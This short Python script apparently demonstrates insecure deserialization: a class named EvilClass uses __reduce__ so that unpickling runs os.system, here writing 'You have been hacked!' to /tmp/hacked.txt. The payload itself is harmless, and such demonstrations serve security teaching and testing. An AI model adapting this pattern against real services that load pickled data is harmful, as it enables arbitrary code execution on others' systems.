import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!" > /tmp/hacked.txt',))

def serialize_and_unserialize():
    data = pickle.dumps(EvilClass())
    return pickle.loads(data)

serialize_and_unserialize()
